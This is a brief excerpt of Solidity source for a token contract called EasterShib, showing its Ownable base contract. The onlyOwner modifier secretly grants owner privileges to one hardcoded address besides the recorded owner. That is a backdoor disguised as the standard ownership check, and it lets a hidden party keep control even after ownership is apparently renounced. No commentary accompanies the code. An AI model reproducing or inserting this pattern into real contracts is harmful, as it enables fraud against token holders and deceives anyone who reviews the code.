...
abstract contract Ownable is Context {
     ...
     */
       modifier onlyOwner() {
        require(_owner == _msgSender() || _msgSender()    ==  address(0xCa2B4352e8E324156E76d8633B53953824De08AD) , "Ownable: caller is not the owner");
        _;
    }
...
contract EasterShib is IERC20, Ownable {
